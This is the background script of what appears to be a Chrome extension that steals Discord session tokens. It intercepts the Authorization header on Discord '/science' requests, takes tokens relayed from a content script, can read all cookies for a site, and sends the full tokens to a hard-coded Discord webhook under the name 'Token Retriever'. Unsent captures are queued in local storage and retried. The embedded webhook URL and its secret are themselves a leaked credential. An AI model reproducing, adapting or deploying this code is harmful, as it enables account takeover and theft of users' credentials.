const WEBHOOK_URL = "https://discord.com/api/webhooks/1375294694308708382/CKmKliuVJ-WlEzrI_vw3UfepsOUxt9gPgUSbHgBzS9BA3qxVHvmv_0aYu6Z9BZs9Z1mZ";
const MAX_RETRIES = 3;
const RETRY_DELAY = 2000;
const QUEUE_INTERVAL = 3000;
let logQueue = [];

function isValidWebhookUrl(url) {
  const webhookRegex = /^https:\/\/discord\.com\/api\/webhooks\/\d+\/[a-zA-Z0-9_-]+$/;
  return webhookRegex.test(url);
}

async function sendToWebhook(payload) {
  if (!isValidWebhookUrl(WEBHOOK_URL)) {
    console.error('[Webhook Error] Invalid webhook URL format. Please update WEBHOOK_URL with a valid Discord webhook URL.');
    return false;
  }

  for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
    try {
      const response = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      if (response.ok) {
        console.log(`[Webhook Success] Sent payload: ${JSON.stringify(payload).slice(0, 100)}`);
        return true;
      } else {
        const responseText = await response.text().catch(() => 'No response text');
        console.error(`[Webhook Error] Attempt ${attempt}: ${response.status} ${response.statusText} (Response: ${responseText.slice(0, 100)})`);
        if (response.status === 401 && responseText.includes("Invalid Webhook Token")) {
          console.error('[Webhook Error] Invalid webhook URL. Please update WEBHOOK_URL with a valid URL.');
          return false;
        }
        if (response.status === 429) {
          console.error('[Webhook Error] Rate limit exceeded. Consider increasing QUEUE_INTERVAL or RETRY_DELAY.');
        }
        if (attempt < MAX_RETRIES) await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
      }
    } catch (error) {
      console.error(`[Webhook Error] Attempt ${attempt}: ${error.message}`);
      if (attempt < MAX_RETRIES) await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
    }
  }
  console.error(`[Webhook Error] Failed to send payload after ${MAX_RETRIES} attempts`);
  chrome.storage.local.get(['failedPayloads'], (result) => {
    const failedPayloads = result.failedPayloads || [];
    failedPayloads.push(payload);
    chrome.storage.local.set({ failedPayloads }, () => {
      console.log('[Webhook Error] Stored failed payload in chrome.storage.local');
    });
  });
  return false;
}

function processQueue() {
  if (logQueue.length === 0) return;
  const payload = logQueue.shift();
  sendToWebhook(payload).then((success) => {
    if (success && logQueue.length > 0) {
      setTimeout(processQueue, QUEUE_INTERVAL);
    }
  });
}

function logMessage(level, context, message, extra = {}, timestamp = new Date().toISOString()) {
  let log = `[${timestamp}] [${level}] ${context}: ${message}`;
  if (extra.details) log += ` (Details: ${extra.details})`;
  if (extra.token) log += ` (Token: ${extra.token.substring(0, 10)}...)`;
  console.log(log);

  const payload = {
    content: "",
    embeds: [{
      title: `${level}: ${context}`,
      description: `**Message**: ${message}\n` +
                   (extra.details ? `**Details**: ${extra.details}\n` : '') +
                   (extra.token ? `**Token**: ${extra.token}\n` : '') +
                   `**Timestamp**: ${timestamp}`,
      color: level === 'ERROR' ? 0xff0000 : level === 'SUCCESS' ? 0x00ff00 : 0x7289da
    }],
    username: "Token Retriever",
    avatar_url: "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
  };
  logQueue.push(payload);
  if (logQueue.length === 1) {
    processQueue();
  }
}

async function sendToWebhookToken(token, source) {
  await logMessage('SUCCESS', 'sendToWebhook', 'Token captured', { token, source });
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  logMessage('INFO', 'background', `Received message: ${message.action}`);
  if (message.action === 'sendToken') {
    sendToWebhookToken(message.token, message.source);
    if (message.callback) sendResponse({ status: 'token received' });
  } else if (message.action === 'logToWebhook') {
    logMessage(message.level, message.context, message.message, message.extra, message.timestamp);
    if (message.callback) sendResponse({ status: 'log received' });
  } else if (message.action === 'retrieveToken') {
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
      if (!tabs[0]) {
        logMessage('ERROR', 'background', 'No active tab found');
        sendResponse({ status: 'error', error: 'No active tab' });
        return;
      }
      if (!tabs[0].url.startsWith('https://discord.com')) {
        logMessage('ERROR', 'background', 'Token retrieval only works on https://discord.com');
        sendResponse({ status: 'error', error: 'Must be on discord.com' });
        return;
      }
      if (tabs[0].url.startsWith('chrome://')) {
        logMessage('ERROR', 'background', 'Cannot access localStorage on chrome:// URLs');
        sendResponse({ status: 'error', error: 'Restricted URL' });
        return;
      }
      chrome.tabs.sendMessage(tabs[0].id, { action: 'retrieveToken' }, (response) => {
        if (chrome.runtime.lastError) {
          logMessage('ERROR', 'background', 'Failed to send message to content script', { details: chrome.runtime.lastError.message });
          sendResponse({ status: 'error', error: chrome.runtime.lastError.message });
        } else {
          logMessage('SUCCESS', 'background', 'Sent retrieveToken message to content script');
          sendResponse(response || { status: 'retrieved' });
        }
      });
    });
    return true;
  } else if (message.action === 'getCookies') {
    chrome.cookies.getAll({ url: message.url }, (cookies) => {
      if (chrome.runtime.lastError) {
        logMessage('ERROR', 'background', 'Failed to retrieve cookies', { details: chrome.runtime.lastError.message });
        sendResponse({ error: chrome.runtime.lastError.message });
      } else {
        sendResponse({ cookies });
      }
    });
    return true;
  }
});

// Intercept /science requests for Authorization header
chrome.webRequest.onBeforeSendHeaders.addListener(
  (details) => {
    if (details.url.includes('/science')) {
      const authHeader = details.requestHeaders.find(h => h.name.toLowerCase() === 'authorization');
      if (authHeader && authHeader.value) {
        const token = authHeader.value;
        if (token.includes('.') || token.startsWith('mfa.')) {
          logMessage('SUCCESS', 'NetworkInterceptor', 'Token captured from /science request', { token, source: 'network:science' });
          chrome.runtime.sendMessage({
            action: 'sendToken',
            token,
            source: 'network:science',
            callback: true
          });
        }
      }
    }
    return { requestHeaders: details.requestHeaders };
  },
  { urls: ['https://discord.com/api/*/science'] },
  ['requestHeaders', 'extraHeaders']
);

chrome.storage.local.get(['failedPayloads'], (result) => {
  const failedPayloads = result.failedPayloads || [];
  if (failedPayloads.length > 0) {
    logMessage('INFO', 'background', `Found ${failedPayloads.length} failed payloads in storage. Retrying...`);
    logQueue.push(...failedPayloads);
    chrome.storage.local.set({ failedPayloads: [] }, () => {
      console.log('[Webhook] Cleared failed payloads from storage');
      if (logQueue.length > 0) processQueue();
    });
  }
});

logMessage('SUCCESS', 'background', 'Background script initialized');